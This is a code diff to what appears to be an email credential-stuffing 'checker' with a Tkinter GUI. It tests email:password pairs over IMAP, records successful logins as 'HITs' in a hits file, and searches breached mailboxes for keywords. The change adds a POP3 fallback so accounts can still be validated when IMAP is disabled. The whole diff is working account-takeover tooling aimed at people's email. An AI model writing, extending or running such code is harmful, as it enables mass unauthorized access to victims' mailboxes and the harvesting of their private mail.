@@ -14,7 +14,8 @@ import subprocess
 from pathlib import Path
 from datetime import datetime
 
-from checker import get_imap_config, imap_login, search_keywords, safe_filename
+from checker import (get_imap_config, imap_login, search_keywords, safe_filename,
+                     pop3_login, _is_imap_disabled, _pop3_host)
 
 # ── Palette ───────────────────────────────────────────────────────────────────
 BG      = "#12121f"
@@ -399,6 +400,16 @@ class App(tk.Tk):
             host, port = cfg["host"], cfg["port"]
             ok, err    = imap_login(host, port, email, password, timeout)
 
+            # POP3 fallback when IMAP is structurally disabled
+            proto = "IMAP"
+            pop3_host_used = None
+            if not ok and _is_imap_disabled(err):
+                ph = _pop3_host(host, domain)
+                if ph:
+                    pop3_ok, _ = pop3_login(ph, 995, email, password, timeout)
+                    if pop3_ok:
+                        ok, err, proto, pop3_host_used = True, None, "POP3", ph
+
             with self._lock:
                 self._checked += 1
 
@@ -407,12 +418,13 @@ class App(tk.Tk):
                     self._stats["hits"] += 1
                     hits = self._stats["hits"]
 
-                self._log(f"{prefix} HIT  {email}  [{host}]  HITS:{hits}", "hit")
+                used_host = pop3_host_used or host
+                self._log(f"{prefix} HIT  {email}  [{used_host}|{proto}]  HITS:{hits}", "hit")
                 with file_lock:
                     with open(hits_path, "a", encoding="utf-8") as f:
                         f.write(f"{email}:{password}\n")
 
-                if keywords and kw_files:
+                if keywords and kw_files and proto == "IMAP":
                     found = search_keywords(host, port, email, password,
                                             keywords, timeout + 10)
                     if found:
